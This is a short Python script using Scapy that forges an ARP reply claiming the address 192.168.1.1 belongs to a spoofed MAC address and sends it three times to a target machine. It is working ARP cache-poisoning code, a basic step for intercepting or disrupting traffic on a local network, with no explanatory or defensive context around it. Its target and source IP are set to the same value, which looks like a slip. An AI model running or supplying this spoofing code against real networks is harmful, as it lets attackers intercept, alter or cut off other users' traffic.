from scapy.all import ARP, Ether, sendp

target_ip  = "192.168.1.1"
target_mac = "AA:BB:CC:11:22:33"  


eth = Ether(dst=target_mac)  
arp = ARP(op=2,
          psrc=target_ip,
          hwsrc="00:11:22:33:44:55",  
          pdst=target_ip,
          hwdst=target_mac)          

sendp(eth/arp, count=3, verbose=False)